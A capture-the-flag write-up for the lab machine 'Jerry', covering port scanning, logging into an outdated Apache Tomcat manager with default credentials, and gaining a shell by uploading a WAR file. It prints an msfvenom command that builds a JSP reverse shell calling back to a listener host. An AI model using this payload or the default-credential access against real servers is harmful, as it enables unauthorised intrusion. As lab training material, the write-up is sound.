Jerry is a very simple box with the purpose of tasking the attackers to work on basic web-enumeration, unrestricted file upload parameters, and simple payload creation. Let's get to it.

### Reconnaissance

Our Scan: `nmap -sV -sC --open -p- 10.10.10.95`

Our Result:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 20:58 EDT

```

### Service Enumeration

By the looks of it, we've got one route here. Apache Tomcat is server hosting software, and this version here is pretty outdated and vulnerable. Specifically, we're able to use the /manager/html path to deploy malicious WAR files to the server. All we need are some credentials to access.

When we navigate to the page, we're met with this screen.

We can see a manager tab on the left. Rooting around a bit, we can gather some more information about the structure of tomcat configurations. However, when we try to navigate to the /manager/html path, we're prompted with a credential portal. 

Now, I tried a few different default credentials and eventually got a 403_Access_Denied

We can see, though, default credentials are given here in plain text. After reinstating the machine and rebooting Firefox, I was able to login again with those.

### Initial Access

Once in, there is good information regarding the name of the machine, services in use, versions, etc.

But, I'm interested in the file upload, as it looks like we have access to gain a shell via malicious files. In order to create one, it'll need to be WAR to fit the server's parameters.

We can use MSFVenom to create one for us, using: 
`msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.3 lport=4321 -f WAR -o pwn.war`

This will create what we need, and we can upload it directly into the site. Once deployed, set up a listener for the port that we specified in the file. Once that is set, act on the file via tomcat, and boom. Shell.

### Post Exploitation

Now, we've gotta find the flags. Syntax here was a bit new to me, but I figured it out. Here's some tips to remember

```
DIR - Directory listing
MORE - Almost 'cat' equivilent
```

Once you navigate to admin, this is what you find!

```
C:\Users\Administrator\Desktoplags>DIR
DIR
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04
